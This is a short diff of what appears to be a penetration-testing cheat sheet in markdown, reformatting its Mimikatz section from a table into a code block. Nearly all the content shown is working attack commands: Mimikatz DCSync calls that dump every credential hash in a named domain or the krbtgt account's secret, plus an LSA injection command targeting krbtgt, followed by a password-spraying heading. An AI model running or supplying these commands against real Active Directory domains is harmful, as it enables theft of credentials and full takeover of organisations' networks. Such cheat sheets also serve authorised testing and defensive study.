@@ -35,21 +35,12 @@
 
 
 ### Mimikatz 
-
-
-
-
-
-
-
-
-|DCSync |
-| ------------- |
+```
 |lsadump::dcsync /domain:pentestlab.local /all /csv|
 |Invoke-Mimikatz -Command '"lsadump::dcsync /domain:insomnia.ninja.corp /all /csv"'|
 |Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'|
 |Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'|
-
+```
 
 |  Password Spraying Attack |
 | ------------- |
